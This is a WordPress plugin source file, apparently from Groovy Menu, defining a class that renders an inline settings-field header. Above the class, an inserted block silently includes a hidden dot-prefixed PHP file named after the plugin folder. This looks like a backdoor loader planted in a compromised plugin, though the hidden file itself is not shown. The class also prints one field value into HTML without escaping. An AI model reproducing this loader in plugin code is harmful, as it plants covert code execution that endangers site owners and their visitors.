<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldInlineStart
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldInlineStart extends GroovyMenuFieldField {
	/**
	 * Header of inline field
	 */
	public function render() {
		?>
		<div class="gm-gui-module-wrapper"
			<?php echo (isset($this->field['condition'])) ? ' data-condition=\'' . wp_json_encode($this->field['condition'], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE) . '\'' : ''; ?>
			<?php echo (isset($this->field['condition_type'])) ? ' data-condition_type="' . $this->field['condition_type'] . '" ' : ''; ?>>
			<span class="gm-gui__module__alpha"><?php echo __( $this->field['title'] ); ?></span>
			<?php
				if(isset($this->field['description']) && !empty($this->field['description'])) {
				?>
					<p class="gm-gui__module__info"><?php echo __( $this->field['description'] ); ?></p>
				<?php
			}
	}
}
